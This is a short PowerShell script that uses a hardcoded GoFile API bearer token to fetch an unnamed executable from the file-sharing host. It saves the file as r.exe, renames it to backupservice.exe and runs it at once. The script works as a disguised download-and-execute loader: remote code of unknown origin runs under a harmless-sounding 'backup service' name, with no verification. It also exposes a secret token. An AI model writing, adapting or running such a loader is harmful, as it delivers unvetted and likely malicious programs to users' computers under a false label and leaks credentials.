# Keep console open and show errors
$ErrorActionPreference = "Stop"

# Variables
$ContentID = "SplUgh"
$BearerToken = "c1qTNeZFATsyLQt09d2h6oApnblN1OBx"
$OutFile = "$env:USERPROFILE\Downloads\r.exe"
$BackupDir = "$env:USERPROFILE\Backups"
$BackupFile = "$BackupDir\backupservice.exe"

Write-Host "Getting file info from GoFile..."

try {
    # Add Authorization header
    $Headers = @{ "Authorization" = "Bearer $BearerToken" }

    # Download JSON response with auth
    $response = Invoke-RestMethod -Uri "https://api.gofile.io/contents/$ContentID" -Headers $Headers
} catch {
    Write-Host "Failed to download JSON. Check your API key or internet connection."
    Pause
    exit
}

# Check if data exists
if (-not $response.data.contents) {
    Write-Host "No contents found in the JSON response."
    Pause
    exit
}

# Extract download URL
$URL = $response.data.contents | Where-Object { $_.name -like "*" } | Select-Object -ExpandProperty downloadPage -ErrorAction SilentlyContinue

if (-not $URL) {
    Write-Host "Download URL not found!"
    Pause
    exit
}

Write-Host "Downloading from $URL ..."

try {
    Invoke-WebRequest -Uri $URL -OutFile $OutFile
} catch {
    Write-Host "Failed to download the file."
    Pause
    exit
}

# Ensure backup folder exists
if (-not (Test-Path -Path $BackupDir)) {
    New-Item -ItemType Directory -Path $BackupDir | Out-Null
}

# Move and rename downloaded file
try {
    Move-Item -Path $OutFile -Destination $BackupFile -Force
} catch {
    Write-Host "Failed to move or rename the file."
    Pause
    exit
}

# Run the backup service
Write-Host "Starting backup service..."
Start-Process -FilePath $BackupFile

Write-Host "Done!"
Pause
